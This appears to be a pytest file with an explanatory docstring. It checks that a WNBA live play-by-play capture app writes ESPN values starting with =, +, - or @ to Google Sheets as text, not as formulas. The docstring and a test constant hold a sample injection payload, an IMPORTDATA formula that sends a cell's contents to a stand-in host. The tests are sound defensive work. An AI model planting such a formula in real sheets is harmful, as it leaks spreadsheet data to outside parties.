"""
Nothing ESPN sends may run as a formula in the tracker sheet.

WHY: three tabs are appended with USER_ENTERED, which makes Sheets read
each value as if it were typed into the cell. A value that starts with
= + - or @ is then a formula. The athlete's name, the athlete ID, the
shot method, the clock and the event ID all come from ESPN's API, so an
athlete named =IMPORTDATA("https://example.com/?"&A1) would have run in
the production sheet the app reads. Found by the security review of the
NBA live capture, November 16, 2026.

The fix keeps USER_ENTERED, so dates, numbers and clocks display as they
always have, and puts an apostrophe in front of any string that starts
like a formula. Sheets reads the apostrophe as "this is text" and does
not show it.

    pip install pytest && python -m pytest tests/ -q
"""

import pytest

import wnba_playbyplay_live as live
from harness import STAMP, TODAY
from test_live_main import wnba_world

HOSTILE_NAME = '=IMPORTDATA("https://example.com/?"&A1)'
HOSTILE_EVENT_ID = "=401+1"


@pytest.fixture
def dispatch_token(monkeypatch):
    monkeypatch.setenv("MAIN_PIPELINE_DISPATCH_TOKEN", "test-token")


def test_a_scorer_named_like_a_formula_is_written_as_text(monkeypatch):
    world = wnba_world()
    world.athletes["a2"]["fullName"] = HOSTILE_NAME

    world.run(monkeypatch)

    tab = world.spreadsheet.tabs["Live First Basket"]
    assert tab.formulas == []
    # The app and the grader read what the cell displays: the name as
    # ESPN sent it, with no apostrophe.
    assert world.tab("Live First Basket")[2] == [
        "401", TODAY, "CON @ ATL", HOSTILE_NAME, "a2", "Atlanta Dream", "G", "Layup", 1, "9:20", STAMP]


def test_an_event_id_like_a_formula_is_logged_as_text(monkeypatch, dispatch_token):
    world = wnba_world()
    world.events[0]["id"] = HOSTILE_EVENT_ID
    world.summaries[HOSTILE_EVENT_ID] = world.summaries.pop("401")

    world.run(monkeypatch)

    for title in ("Live First Basket", "Post-Tip Dispatch Log", "Live Grading Dispatch Log"):
        assert world.spreadsheet.tabs[title].formulas == [], title
        assert HOSTILE_EVENT_ID in [row[0] for row in world.tab(title)], title


class TestTypedAsText:
    @pytest.mark.parametrize("value", ["=1+1", "+1", "-1", "@SUM(A1)", " =1+1", "\t=1+1"])
    def test_a_string_that_starts_like_a_formula_gets_an_apostrophe(self, value):
        assert live.typed_as_text([[value]]) == [["'" + value]]

    def test_ordinary_values_are_untouched(self):
        row = ["401", TODAY, "CON @ ATL", "Player Two", "a2", "Atlanta Dream", "G", "Layup", 1, "9:20", STAMP]
        assert live.typed_as_text([row]) == [row]

    def test_numbers_stay_numbers(self):
        assert live.typed_as_text([[-1, 1.5, None]]) == [[-1, 1.5, None]]
